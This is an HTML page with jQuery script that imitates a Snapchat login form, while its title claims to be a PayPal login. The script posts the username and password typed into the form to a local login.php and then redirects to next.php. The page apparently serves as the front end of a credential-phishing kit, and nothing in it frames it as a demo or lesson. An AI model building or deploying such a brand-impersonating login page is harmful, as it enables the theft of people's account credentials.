
<!DOCTYPE html>
<html>
<head>
     <title>Log in to your PayPal Account</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
  <link href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<script src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.0/js/bootstrap.min.js"></script>
<script src="//code.jquery.com/jquery-1.11.1.min.js"></script>

<!-- jQuery library -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>

<!-- Popper JS -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>

<!-- Latest compiled JavaScript -->
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"></script>
</head>
<style type="text/css">
    

h2 {
  margin-top: 2px;
  margin-bottom: 2px;
}

.container { max-width: 350px; }

.divider {
  text-align: center;
  margin-top: 20px;
  margin-bottom: 5px;
}

.divider hr {
  margin: 7px 0px;
  width: 35%;
}

.left { float: left; }

.right { float: right; }
#result{
    
     display: none;
     position: relative;
     border-radius: 5px;
     padding:3px;
     width: 100%;
    margin: 0 0 10px;
     
}
#result p{
   color: red;
  margin-top: 7px;

}
#result p i{
  color: #c72e2e; font-size:20px; margin-left: 3px;
}
.form-group input:hover{
 border-color: yellow;
  }

input[type=text]:focus{
 
  border-bottom: "1px solid red"; 
}
.form-group input{
  border: 1px solid transparent;
  background-color: #f7f7f7
}
.button{
  background-color: yellow; 
  border: none;
  padding: 4px 8px;
  border-radius: 20px; 
  font-size: 16px;
  width: 80px;
  height: 40px;

}
</style>
<body>

<div class="container" >
     <div class="row">
          <div class="panel panel-default"style="margin-top: 50px;">
          <div class="panel-body">
         <form method="POST" >
            
   <center><img src="download.png" class="img-responsive" style="margin-top: 5px; width: 35px; display: block;"></center>
       <h3 class="text-center"><b>Log in to Snapchat</b></h3>
        <h5 class="text-center" id="result" style="font-size: 14px;"><p><b>Cannot find the user</b></p></h5>

       <label> Username or Email</label>
        <div class="form-group">
             <input type="text" name="email" id="email" autocomplete="off" maxlength="50" class="form-control" >
        </div>
        
       <label> Password</label>
           <div class="form-group">
             <input  type="password" id="password" name="password" maxlength="25" class="form-control">
        <span class="right"><a   style="color: #000;" href="#">Forgot password?</a></span>
        </div><br>

       <center><button class="button" type="button"  name="submit" id="submit">Log in</button></center>
              </div>
            </div>
               </div>
            <h5 class="text-center"><b>New To Snapchat? <span><a href="#" style="color: #000;"> Sign Up</a></span></b></h5>    
</div>
</center>
</form>

<script type="text/javascript">
   $('#submit').on('click', function() {
        var email=$('#email').val();
        var password=$('#password').val();
        //alert(email);
         if(email =="")
        {
          alert("Enter email");
          document.getElementById('email').focus();
          //return false;
        }
        else if(password == "")
        {
          alert("Please enter password");
           document.getElementById('password').focus();
        }
        else
        {
          $.ajax({
          type:'post',
          url:'login.php',
          data: {email:email,password:password},
          success:function(data) {
            if(data ==1){
              window.location.href='next.php';
              // alert("success");
            }
            else{
             $('#result').show();
            
            }
          }
        
       }); 
       }  
     });
</script>